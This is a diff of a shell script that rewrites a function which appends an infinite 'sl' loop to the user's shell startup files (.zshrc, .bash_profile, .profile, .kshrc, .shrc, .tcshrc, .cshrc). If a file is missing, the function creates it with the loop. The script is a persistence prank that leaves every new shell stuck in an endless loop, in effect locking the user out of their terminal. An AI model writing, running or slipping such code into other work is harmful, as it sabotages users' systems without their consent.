@@ -2,33 +2,33 @@
 
 function poll_for_removal_of_while_loop {
 	rc_file=$1
-	type_of_shell=$2
+	shift 1
+	loop_to_insert=$@
 
-	if [[ "$type_of_shell" -eq "1" ]]; then
-		status_rc_file=`cat $rc_file 2>/dev/null| grep "while true; do sl; done"`
-		if [[ -z "$status_rc_file" ]]; then
-			chmod u+w $rc_file
-			echo -e "\nwhile true; do sl; done"|cat>>$rc_file
+	if [[ -f $rc_file ]]; then
+		check_if_loop_already_exists=`cat $rc_file | grep "$(echo -e "$loop_to_insert")"`
+		if [[ -z $check_if_loop_already_exists ]]; then
+			cat $rc_file > temp && echo -e "\n$loop_to_insert" >> temp && rm -f $rc_file
+			mv temp $rc_file
 		fi
 	else
-		status_rc_file=`cat $rc_file 2>/dev/null|grep  "while (1)"`
-		if [[ -z "$status_rc_file" ]]; then
-			chmod u+w $rc_file
-			echo -e "\nwhile (1)\n sl\n end"|cat>>$rc_file
-		fi
+		echo -e $loop_to_insert > $rc_file
 	fi
-	
 }
 
+
 function modify_rc_files {
+	bash_like_while_loop="while true; do sl; done"
+	c_like_while_loop="while (1)\n sl\n end"
+
 	cd ~
-	poll_for_removal_of_while_loop ~/.zshrc 1
-	poll_for_removal_of_while_loop ~/.bash_profile 1
-	poll_for_removal_of_while_loop ~/.profile 1
-	poll_for_removal_of_while_loop ~/.kshrc 1
-	poll_for_removal_of_while_loop ~/.shrc 1
-	poll_for_removal_of_while_loop ~/.tcshrc 2
-	poll_for_removal_of_while_loop ~/.cshrc 2
+	poll_for_removal_of_while_loop ~/.zshrc $bash_like_while_loop
+	poll_for_removal_of_while_loop ~/.bash_profile $bash_like_while_loop
+	poll_for_removal_of_while_loop ~/.profile $bash_like_while_loop
+	poll_for_removal_of_while_loop ~/.kshrc $bash_like_while_loop
+	poll_for_removal_of_while_loop ~/.shrc $bash_like_while_loop
+	poll_for_removal_of_while_loop ~/.tcshrc $c_like_while_loop
+	poll_for_removal_of_while_loop ~/.cshrc $c_like_while_loop
 
 }
 
